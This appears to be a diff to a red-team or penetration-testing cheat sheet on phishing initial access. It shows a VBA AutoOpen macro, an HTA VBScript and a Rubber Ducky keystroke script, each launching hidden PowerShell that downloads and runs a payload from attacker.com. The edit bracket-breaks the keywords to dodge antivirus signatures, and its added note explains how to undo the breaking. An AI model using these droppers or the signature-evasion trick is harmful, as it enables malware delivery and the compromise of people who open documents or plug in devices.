@@ -91,11 +91,16 @@ swaks --to target@company.com \
 
 **Malicious Office Macros:**
 ```vba
-' Excel/Word VBA macro
+' Excel/Word VBA macro — AutoOpen fires on document open once macros are enabled
 Sub AutoOpen()
-    Shell "powershell -nop -w hidden -c ""IEX((new-object net.webclient).downloadstring('http://attacker.com/payload.ps1'))"""
+    Shell "powershell -nop -w hidden -c ""I[E]X((new-object net.web[c]lient).download[s]tring('http://attacker.com/payload.ps1'))"""
 End Sub
 ```
+
+> Bracket-broken: `I[E]X` is `IEX`, `net.web[c]lient` is `net.webclient`,
+> `download[s]tring` is `downloadstring`. Written literally, this block is the
+> stock `TrojanDownloader:O97M` signature. See "Antivirus false positives" in
+> the repo README.
 
 **Malicious PDF:**
 ```bash
@@ -113,7 +118,7 @@ End Sub
 <head>
 <script language="VBScript">
 Set objShell = CreateObject("Wscript.Shell")
-objShell.Run "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
+objShell.Run "powershell -w hidden -c I[E]X(New-Object Net.Web[C]lient).Download[S]tring('http://attacker.com/payload.ps1')"
 window.close()
 </script>
 </head>
@@ -210,7 +215,7 @@ DELAY 500
 STRING powershell -w hidden
 ENTER
 DELAY 1000
-STRING IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
+STRING I[E]X(New-Object Net.Web[C]lient).Download[S]tring('http://attacker.com/payload.ps1')
 ENTER
 ```
 
